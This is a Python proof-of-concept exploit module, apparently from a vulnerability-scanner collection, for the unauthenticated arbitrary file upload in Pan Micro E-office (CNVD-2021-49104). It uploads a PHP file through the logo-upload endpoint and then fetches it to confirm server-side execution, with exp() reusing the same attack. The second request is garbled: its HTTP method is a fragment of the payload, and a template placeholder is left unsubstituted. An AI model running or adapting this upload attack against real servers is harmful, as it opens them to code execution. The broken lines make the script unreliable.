import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Pan Micro E-office File Uploads''',
        "description": '''The Pan Wei Micro E-office version running allows arbitrary file uploads from a remote attacker.''',
        "severity": "critical",
        "references": [
            "https://chowdera.com/2021/12/202112200602130067.html", 
            "http://v10.e-office.cn"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["pan", "micro", "cnvd", "cnvd2021"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="""
        method = "POST"
        data = """--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
Content-Type: image/jpeg

<?php echo md5('CNVD-2021-49104');?>

--e64bdf16c554bbc109cecef6451c26a4--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/images/logo/logo-eoffice.php"""
        method = "CNVD-2021-49104\');?>\n\n--e64bdf16c554bbc109cecef6451c26a4--\n',"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""94d01a2324ce38a2e29a629c54190f67""" in resp1.text) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url